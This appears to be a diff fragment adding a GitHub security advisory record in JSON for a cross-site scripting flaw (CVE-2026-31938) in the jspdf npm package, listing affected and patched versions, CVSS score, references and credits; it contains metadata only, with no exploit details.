+    "repository_advisory_url": "https://api.github.com/repos/parallax/jsPDF/security-advisories/GHSA-wfv2-pwc8-crg5",
+    "source_code_location": "https://github.com/parallax/jsPDF",
+    "identifiers": [
+      {
+        "value": "GHSA-wfv2-pwc8-crg5",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-31938",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/parallax/jsPDF/security/advisories/GHSA-wfv2-pwc8-crg5",
+      "https://github.com/parallax/jsPDF/commit/87a40bbd07e6b30575196370670b41f264aa78d7",
+      "https://github.com/parallax/jsPDF/releases/tag/v4.2.1",
+      "https://github.com/advisories/GHSA-wfv2-pwc8-crg5"
+    ],
+    "published_at": "2026-03-17T17:07:59Z",
+    "updated_at": "2026-03-17T17:08:01Z",
+    "github_reviewed_at": "2026-03-17T17:07:59Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "jspdf"
+        },
+        "vulnerable_version_range": "\u003c= 4.2.0",
+        "first_patched_version": "4.2.1",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L",
+        "score": 9.6
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-79",
+        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "sofianeelhor",
+          "id": 43454096,
+          "node_id": "MDQ6VXNlcjQzNDU0MDk2",
+          "avatar_url": "https://avatars.githubusercontent.com/u/43454096?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/sofianeelhor",
+          "html_url": "https://github.com/sofianeelhor",
+          "followers_url": "https://api.github.com/users/sofianeelhor/followers",
+          "following_url": "https://api.github.com/users/sofianeelhor/following{/other_user}",
+          "gists_url": "https://api.github.com/users/sofianeelhor/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/sofianeelhor/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/sofianeelhor/subscriptions",
+          "organizations_url": "https://api.github.com/users/sofianeelhor/orgs",
+          "repos_url": "https://api.github.com/users/sofianeelhor/repos",
+          "events_url": "https://api.github.com/users/sofianeelhor/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/sofianeelhor/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "peaktwilight",
+          "id": 77903714,
+          "node_id": "MDQ6VXNlcjc3OTAzNzE0",
+          "avatar_url": "https://avatars.githubusercontent.com/u/77903714?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/peaktwilight",
+          "html_url": "https://github.com/peaktwilight",
+          "followers_url": "https://api.github.com/users/peaktwilight/followers",
+          "following_url": "https://api.github.com/users/peaktwilight/following{/other_user}",
+          "gists_url": "https://api.github.com/users/peaktwilight/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/peaktwilight/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/peaktwilight/subscriptions",
+          "organizations_url": "https://api.github.com/users/peaktwilight/orgs",
+          "repos_url": "https://api.github.com/users/peaktwilight/repos",
+          "events_url": "https://api.github.com/users/peaktwilight/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/peaktwilight/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_reviewer"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L",
+      "score": 9.6
+    },
+    "epss": {
+      "percentage": 0.00038,
+      "percentile": 0.11105
+    }
+  }
+]
